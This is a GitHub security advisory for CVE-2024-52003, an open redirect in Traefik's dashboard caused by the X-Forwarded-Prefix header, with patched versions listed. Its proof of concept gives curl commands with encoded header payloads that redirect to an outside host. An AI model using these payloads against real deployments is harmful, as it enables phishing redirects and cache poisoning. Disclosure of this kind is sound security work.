# [M] Traefik's X-Forwarded-Prefix Header still allows for Open Redirect

## Summary
Severity: Medium
Advisory: GHSA-h924-8g65-j9wg
CVE: CVE-2024-52003
CWE: CWE-601
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2024-12-02
Source: https://github.com/advisories/GHSA-h924-8g65-j9wg
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.14
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.2.1

## Details
### Impact

There is a vulnerability in Traefik that allows the client to provide the `X-Forwarded-Prefix` header from an untrusted source.

### Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.14
- https://github.com/traefik/traefik/releases/tag/v3.2.1

### Workarounds

No workaround.

### For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>
### Summary
The previously reported open redirect ([GHSA-6qq8-5wq3-86rp](https://github.com/traefik/traefik/security/advisories/GHSA-6qq8-5wq3-86rp)) is not fixed correctly. The safePrefix function can be tricked to return an absolute URL.



### Details
The Traefik API [dashboard component](https://github.com/traefik/traefik/blob/master/pkg/api/dashboard/dashboard.go) tries to validate that the value of the header X-Forwarded-Prefix is a site relative path:
```go
http.Redirect(resp, req, safePrefix(req)+"/dashboard/", http.StatusFound)
```

```go
func safePrefix(req *http.Request) string {
	prefix := req.Header.Get("X-Forwarded-Prefix")
	if prefix == "" {
		return ""
	}

	parse, err := url.Parse(prefix)
	if err != nil {
		return ""
	}

	return parse.Path
}
```

### PoC
An attacker can bypass this by sending the following payload:

```bash
curl -v 'http://traefik.localhost' -H 'X-Forwarded-Prefix: %0d//a.com'
[...]
> HTTP/1.1 302 Found
> Location: //a.com/dashboard/
```

or similar:

```bash
curl -v 'http://traefik.localhost' -H 'X-Forwarded-Prefix: %2f%2fa.com'
[...]
> HTTP/1.1 302 Found
> Location: //a.com/dashboard/
```

### Impact
Similar to the previously reported bug. In cache poisoning scenarios this may be exploitable.
</details>

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-h924-8g65-j9wg
- https://nvd.nist.gov/vuln/detail/CVE-2024-52003
- https://github.com/traefik/traefik/pull/11253
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.14
- https://github.com/traefik/traefik/releases/tag/v3.2.1
